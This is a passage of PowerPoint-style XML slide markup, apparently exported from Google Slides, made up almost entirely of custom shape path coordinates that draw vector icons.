                  <a:lnTo>
                    <a:pt x="4623" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="3192"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3962" y="13426"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4623" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="14636"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="14783"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="14857"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="14893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="14893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="15150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="15223"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="15333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="14050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="13426"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4256" y="15737"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4696" y="15847"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="16067"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="16287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="16250"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="15994"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="15737"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4843" y="15920"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4989" y="15957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="15994"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="16360"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="16360"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="15920"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4146" y="14453"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4659" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="14857"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="15333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="15553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="15663"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="15774"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="15847"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="15884"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="15957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="15957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="16067"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="16214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="16397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="16507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="16581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="15774"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="15370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="15223"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="15113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="14857"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="14563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="14453"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5503" y="16067"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5723" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="16287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="16434"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="16617"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="16837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="16764"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="16691"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="16067"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5980" y="16214"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6200" y="16287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="16324"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="16434"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="16581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="16727"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="16947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="16911"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="16544"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="16214"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6383" y="16360"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6897" y="16544"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="16801"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="16947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="17131"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="17057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="16984"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="16911"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="16874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="16617"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="16397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="16360"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7080" y="16581"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7410" y="16691"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="16911"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="17314"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="17241"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="17167"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="17131"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="16837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="16581"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8034" y="2678"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7704" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="14160"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="14857"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="15040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="15187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="15370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="15480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="15590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="15627"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="15590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="15553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="15553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="15700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="15810"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="15957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="16324"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="16507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="16654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="16801"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="16874"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="16947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="17021"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="17057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="17094"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="17167"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="17277"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="17388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="17424"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="17461"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="17681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="17754"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="17791"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="17754"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="17718"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="17681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="17608"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="17534"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="17204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="17021"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="16837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="17021"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="17021"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="16984"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="16911"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="16764"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="16581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="16360"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="15884"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="15700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="15590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="15517"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="15407"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="15260"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="15113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="14930"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="14857"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="14783"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="14050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="13683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="13353"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12656" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12803" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13023" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13023" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12913" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="267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296" name="Google Shape;296;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6244725" y="2547975"/>
              <a:ext cx="185275" cy="404450"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="7411" h="16178" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="3339" y="147"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3229" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="147"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1725" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1688" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="1"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4953" y="184"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4879" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="3522"/>
